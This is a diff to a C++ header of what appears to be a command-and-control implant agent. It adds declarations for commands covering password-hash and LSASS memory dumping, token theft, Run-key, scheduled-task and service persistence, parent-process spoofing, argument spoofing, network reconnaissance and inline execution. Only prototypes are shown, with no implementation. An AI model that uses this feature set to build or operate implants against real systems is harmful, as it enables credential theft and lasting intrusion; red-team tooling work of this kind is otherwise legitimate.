@@ -257,6 +257,94 @@ namespace starburst {
     auto declfn cmd_spawnto_x86( instance& inst, char* task_uuid, Parser* params ) -> void;
 #endif
 
+#ifdef INCLUDE_CMD_SPAWN
+    auto declfn cmd_spawn( instance& inst, char* task_uuid, Parser* params ) -> void;
+#endif
+
+#ifdef INCLUDE_CMD_ARP
+    auto declfn cmd_arp( instance& inst, char* task_uuid, Parser* params ) -> void;
+#endif
+
+#ifdef INCLUDE_CMD_DRIVES
+    auto declfn cmd_drives( instance& inst, char* task_uuid, Parser* params ) -> void;
+#endif
+
+#ifdef INCLUDE_CMD_UPTIME
+    auto declfn cmd_uptime( instance& inst, char* task_uuid, Parser* params ) -> void;
+#endif
+
+#ifdef INCLUDE_CMD_NET_SESSIONS
+    auto declfn cmd_net_sessions( instance& inst, char* task_uuid, Parser* params ) -> void;
+#endif
+
+#ifdef INCLUDE_CMD_NET_SHARES
+    auto declfn cmd_net_shares( instance& inst, char* task_uuid, Parser* params ) -> void;
+#endif
+
+#ifdef INCLUDE_CMD_NET_LOGGEDON
+    auto declfn cmd_net_loggedon( instance& inst, char* task_uuid, Parser* params ) -> void;
+#endif
+
+#ifdef INCLUDE_CMD_CLIPBOARD
+    auto declfn cmd_clipboard( instance& inst, char* task_uuid, Parser* params ) -> void;
+#endif
+
+#ifdef INCLUDE_CMD_WINDOWS
+    auto declfn cmd_windows( instance& inst, char* task_uuid, Parser* params ) -> void;
+#endif
+
+#ifdef INCLUDE_CMD_REG_DELETE
+    auto declfn cmd_reg_delete( instance& inst, char* task_uuid, Parser* params ) -> void;
+#endif
+
+#ifdef INCLUDE_CMD_REG_CREATE_KEY
+    auto declfn cmd_reg_create_key( instance& inst, char* task_uuid, Parser* params ) -> void;
+#endif
+
+#ifdef INCLUDE_CMD_PERSIST_RUN
+    auto declfn cmd_persist_run( instance& inst, char* task_uuid, Parser* params ) -> void;
+#endif
+
+#ifdef INCLUDE_CMD_PERSIST_SCHTASK
+    auto declfn cmd_persist_schtask( instance& inst, char* task_uuid, Parser* params ) -> void;
+#endif
+
+#ifdef INCLUDE_CMD_PERSIST_SERVICE
+    auto declfn cmd_persist_service( instance& inst, char* task_uuid, Parser* params ) -> void;
+#endif
+
+#ifdef INCLUDE_CMD_PPID_SPOOF
+    auto declfn cmd_ppid_spoof( instance& inst, char* task_uuid, Parser* params ) -> void;
+#endif
+
+#ifdef INCLUDE_CMD_ARGUE
+    auto declfn cmd_argue( instance& inst, char* task_uuid, Parser* params ) -> void;
+#endif
+
+#ifdef INCLUDE_CMD_RUNAS
+    auto declfn cmd_runas( instance& inst, char* task_uuid, Parser* params ) -> void;
+#endif
+
+#ifdef INCLUDE_CMD_HASHDUMP
+    auto declfn cmd_hashdump( instance& inst, char* task_uuid, Parser* params ) -> void;
+#endif
+
+#ifdef INCLUDE_CMD_LSASS_DUMP
+    auto declfn cmd_lsass_dump( instance& inst, char* task_uuid, Parser* params ) -> void;
+#endif
+
+#ifdef INCLUDE_CMD_TOKEN_STORE
+    auto declfn cmd_token_store( instance& inst, char* task_uuid, Parser* params ) -> void;
+#endif
+
+#ifdef INCLUDE_CMD_PORTSCAN
+    auto declfn cmd_portscan( instance& inst, char* task_uuid, Parser* params ) -> void;
+#endif
+
+#ifdef INCLUDE_CMD_INLINE_EXECUTE
+    auto declfn cmd_inline_execute( instance& inst, char* task_uuid, Parser* params ) -> void;
+#endif
+
 }
 
 #endif
